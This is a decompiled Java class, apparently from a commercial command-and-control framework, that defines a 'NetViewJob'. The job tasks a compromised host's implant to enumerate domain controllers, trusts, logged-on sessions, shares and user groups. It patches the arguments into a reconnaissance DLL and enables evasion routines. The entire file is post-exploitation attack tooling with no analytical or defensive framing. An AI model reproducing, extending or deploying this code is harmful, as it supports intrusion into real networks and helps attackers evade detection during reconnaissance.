package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class NetViewJob extends Job {
   protected String command;
   protected String target;
   protected String param;

   public NetViewJob(TaskBeacon var1, String var2, String var3, String var4) {
      super(var1);
      this.command = var2;
      this.target = var3;
      this.param = var4;
   }

   public String getTactic() {
      if (CommonUtils.toSet("computers, dclist, domain_controllers, domain_trusts, view").contains(this.command)) {
         return "T1018";
      } else if (CommonUtils.toSet("group, localgroup, user").contains(this.command)) {
         return "T1087";
      } else if (CommonUtils.toSet("logons, sessions").contains(this.command)) {
         return "T1033";
      } else if ("share".equals(this.command)) {
         return "T1135";
      } else {
         return "time".equals(this.command) ? "T1124" : "";
      }
   }

   public boolean ignoreToken() {
      return false;
   }

   public String getDescription() {
      StringBuffer var1 = new StringBuffer();
      var1.append("Tasked beacon to run net " + this.command);
      if (this.param != null) {
         var1.append(" " + this.param);
      }

      if (this.target != null) {
         var1.append(" on " + this.target);
      }

      return var1.toString();
   }

   public String getShortDescription() {
      return "net " + this.command;
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/netview.x64.dll" : "resources/netview.dll";
   }

   public String getPipeName() {
      return "netview";
   }

   public int getCallbackType() {
      return 24;
   }

   public int getWaitTime() {
      return 30000;
   }

   public byte[] fix(byte[] var1) {
      Packer var2 = new Packer();
      var2.little();
      var2.addWideString(this.command, 2048);
      if (this.target != null) {
         var2.addWideString(this.target, 2048);
      } else {
         var2.pad('\u0000', 2048);
      }

      if (this.param != null) {
         var2.addWideString(this.param, 2048);
      } else {
         var2.pad('\u0000', 2048);
      }

      String var3 = CommonUtils.bString(var2.getBytes());
      var1 = CommonUtils.patch(var1, "PATCHME!12345", var3);
      return var1;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }
}
